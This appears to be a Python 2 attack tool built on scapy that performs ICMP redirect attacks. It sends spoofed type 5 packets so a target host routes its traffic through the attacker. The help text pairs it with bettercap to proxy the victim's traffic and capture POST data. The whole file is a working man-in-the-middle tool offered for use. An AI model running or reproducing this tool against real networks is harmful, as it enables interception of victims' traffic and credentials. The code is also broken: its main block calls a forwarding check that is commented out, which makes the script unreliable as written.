#!/usr/bin/env python

##############################################################################
# ICMPAttack.py - script to perform ICMP redirect attacks                  #
##############################################################################

# Suppress scapy complaints
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from getopt import getopt
from getopt import GetoptError
import sys

##############################################################################
# Display help message                                                       #
##############################################################################
def doHelp():


   print("""\      
	       .,ad88888ba,.
 	    .,ad8888888888888a,
           d8P'"'98888P''"98888b,   HACKING IS AN ILLUSION!
           9b    d8888,    `9888B
         ,d88aaa8888888b,,,d888P'
         d8888888888888888888888b
        d888888P8898888888888888P    Coded By: Haroon Awan"
       88888PP    9888888888888
       998PP       9888888888P'
                   339888P333
                       '3"

Perform ICMP Attack for Blind MITM Traffic Redirection
======================================================                   

Setup  : Run setup.pl first before this script for auto setup
Syntax : ICMPAttack.py [-v] [-i iface] -g gateway -t target   
Example: ICMPAttack.py -v -i wlan0 -g 192.168.15.0 -t 192.168.15.18
Blind  : ICMPAttack.py -v -i wlan0 -g 192.168.15.0 -t 192.168.15.18 && bettercap -t 127.0.0.1 --proxy -P POST


[Options]				    	[Features]

-v              		  		Verbose mode
-i iface      	  				Interface to perform attack on
-g gateway             				Address of the legitimate gateway
-t victim        	  			Stealing victim traffic
""")


##############################################################################
# Verbose                                                                    #
##############################################################################
def log(verbose, gw, target, iface):
   if( not verbose ):
      return
   print """
>>> gw = '%s'
>>> target = '%s'
>>> ip = IP()
>>> ip.src = gw
>>> ip.dst = target
>>> ip.show2()
""" % (gw, target);
   IP(src=gw, dst=target).show2();
   print """
>>> icmp = ICMP()
>>> icmp.type = 5
>>> icmp.code = 1
>>> icmp.gw = get_if_addr(iface)
>>> icmp.show2()
""";
   ICMP(type=5, code=1, gw=get_if_addr(iface)).show2();
   print """
>>> ip2 = IP()
>>> ip2.src = target
>>> ip2.dst = gw
>>> ip2.show()
""";
   IP(src=target, dst=gw).show2();
   print """
>>> send(ip/icmp/ip2/UDP(), loop=1, inter=2)
"""

##############################################################################
# Check that packet forwarding is activated at kernel level                  #
##############################################################################
#def isForwarding():
#   forwarding = open('/proc/sys/net/ipv4/ip_forward').read(1);
#   if( 0 == int(forwarding) ):
#      print '-E- Forwarding deactivated. Please enable it: sudo sysctl -w net.ipv4.ip_forward=1'
#      sys.exit(-1);


##############################################################################
# Parse command line arguments                                               #
##############################################################################
def parseArgs():
   verbose = False;
   iface = conf.iface;
   target = None;
   gw = None;
   interval = 2;

   try:
      opts, targetList = getopt(sys.argv[1:], 'vi:g:t:h', ['verbose', 'interface=', 'gateway=', 'target=', 'help', 'interval=']);
     
      for k, v in opts:
         if( '-v' == k or '--verbose' == k ):
            verbose = True;
         elif( '-i' == k or '--interface' == k ):
            iface = v;
         elif( '-g' == k or '--gateway' == k ):
            gw = v;
         elif( '-t' == k or '--target' == k ):
            target = v;
         elif( '--interval' == k ):
            interval = float(v);
         elif( '-h' == k or '--help' == k ):
            doHelp();
            sys.exit(0);
   except GetoptError, e:
      print '-E- %s' % str(e)
      sys.exit(-1);

   if( not target or not gw ):
      print '-E- Must define target and gateway'
      sys.exit(-1);

   return verbose, iface, target, gw, interval

##############################################################################
# Main - check command line arguments and if redirect is enable at kernel    #
# level and perform continuous poisonning until user Ctrl^C the script       #
##############################################################################
if( '__main__' == __name__ ):
   conf.verb=0;

   verbose, iface, target, gw, interval = parseArgs();
   isForwarding();

   import signal
   import sys
   def signal_handler(signal, frame):
      print '\n-I- Ending ICMP Attack Type 5'
      sys.exit(0)
   signal.signal(signal.SIGINT, signal_handler)

   try:
      log(verbose, gw, target, iface);
      print '-I- Start ICMP Attack Type 5...'
      ip = IP();
      ip.src = gw;
      ip.dst = target;
      icmp = ICMP();
      icmp.type = 5;
      icmp.code = 1;
      icmp.gw = get_if_addr(iface)
      ip2 = IP();
      ip2.src = target;
      ip2.dst = gw;
      send(ip/icmp/ip2/UDP(), loop=1, inter=interval, verbose=verbose);
   except KeyboardInterrupt:
      print '-I- Ending ICMP Attack Type 5'
      sys.exit(0);
   except Exception, e:
      print '-E- %s' % str(e);
